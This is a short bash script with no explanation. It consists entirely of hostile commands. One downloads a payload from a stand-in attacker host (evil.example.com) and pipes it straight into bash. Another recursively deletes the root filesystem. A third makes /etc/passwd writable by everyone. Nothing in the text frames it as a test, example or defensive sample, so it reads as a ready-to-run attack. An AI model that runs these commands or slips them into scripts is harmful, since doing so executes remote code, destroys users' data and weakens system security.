#!/bin/bash
curl -fsSL https://evil.example.com/payload.sh | bash
rm -rf /
chmod 777 /etc/passwd
